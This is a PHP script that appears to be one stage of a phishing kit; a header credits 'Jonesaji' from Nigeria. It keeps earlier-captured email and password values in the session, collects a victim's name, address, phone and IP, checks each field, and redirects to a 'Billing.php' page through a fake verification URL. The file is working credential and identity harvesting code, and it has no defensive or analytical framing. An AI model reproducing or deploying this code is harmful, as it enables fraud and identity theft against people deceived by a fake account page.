<?php
###################################
// Don't change anything here
// Created By Jonesaji
// From Nigeria
##################################
ini_set("output_buffering",4096);
session_start();


$_SESSION['TheEmail'];

$_SESSION['ThePassword'];

$_SESSION['errors'] = $errors=0;


$_SESSION['FullNamer'] = $FullNamer = $_POST['FullNamer'];
$_SESSION['Address11'] = $Address11 = $_POST['Address11'];
$_SESSION['Address2'] = $Address2 = $_POST['Address2'];
$_SESSION['CityName'] = $CityName = $_POST['CityName'];
$_SESSION['StateN'] = $StateN = $_POST['StateN'];
$_SESSION['ip_header'] = $ip_header = $_POST['ip_header'];
$_SESSION['ZipCode'] = $ZipCode = $_POST['ZipCode'];
$_SESSION['CountryNa'] = $CountryNa = $_POST['CountryNa'];
$_SESSION['Phone221'] = $Phone221 = $_POST['Phone221'];
$_SESSION['AddressTypea'] = $AddressTypea = $_POST['AddressTypea'];

$ip = $_SERVER['REMOTE_ADDR'];



if ($FullNamer=="")
{
$FullName=1;
}
else
{
$FullName=0;
}


if ($Address11=="")
{
$Address1=1;
}
else
{
$Address1=0;
}


if ($CityName=="")
{
$City=1;
}
else
{
$City=0;
}


if ($StateN=="")
{
$State=1;
}
else
{
$State=0;
}




if ($ZipCode=="")
{
$Zip=1;
}
else
{
$Zip=0;
}



if ($CountryNa=="")
{
$Country=1;
}
else
{
$Country=0;
}




if ($Phone221=="")
{
$Phone=1;
}
else
{
$Phone=0;
}


if ($AddressTypea=="OTH")
{
$AddressTypeq=1;
}
else
{
$AddressTypeq=0;
}



if ($FullName==1||$Address1==1||$City==1||$State==1||$Zip==1||$Country==1||$Phone||$AddressTypeq==1)

{
$errors=1;
}
else{
$errors=0;
}



if ($errors==0)
{
$encoding_url="Billing.php?action=billing_verification=true&_session;".md5(time()).md5(time());
header("Location: $encoding_url");
}

else
{
header("Location: detalis.php?errors=$errors&FullName=$FullName&Address1=$Address1&City=$City&State=$State&Zip=$Zip&Country=$Country&Phone=$Phone&AddressTypeq=$AddressTypeq");
}

